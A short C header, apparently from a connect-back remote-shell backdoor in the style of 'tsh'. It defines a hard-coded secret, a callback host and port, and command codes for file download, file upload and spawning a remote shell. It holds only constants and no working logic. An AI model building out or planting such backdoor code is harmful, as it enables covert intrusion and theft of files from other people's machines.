#define SECRET "tinnyssh"
#define CB_HOST "127.0.0.1"
#define SERVER_PORT 55556
#define CONNECT_BACK_DELAY 5

#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3
#define CLEAR_CMD 4

/* 文件传输使用的大缓冲区（pel.h中的BUFSIZE=4096用于协议，这个用于文件传输） */
#define FILE_BUFSIZE 131072

/* 全局消息缓冲区声明 */
extern unsigned char message[FILE_BUFSIZE + 1];
